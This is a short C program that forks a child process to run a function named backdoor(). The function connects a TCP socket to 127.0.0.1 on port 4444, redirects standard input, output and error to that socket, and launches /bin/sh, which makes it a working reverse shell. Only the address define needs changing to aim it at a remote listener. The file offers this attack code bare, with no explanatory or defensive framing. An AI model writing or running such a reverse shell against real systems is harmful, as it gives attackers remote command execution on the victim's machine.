#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>


//==========================
#define PORT 4444        //|
//==========================



#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444

void backdoor()
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    
}


int main(void) {

    pid_t p = fork();
    if(p == 0){
    backdoor(); // <-- the child has to do the work 
    }
    else{
    printf("Well this parent with pid %i pay his respect",p);
    }
    return 0;
}
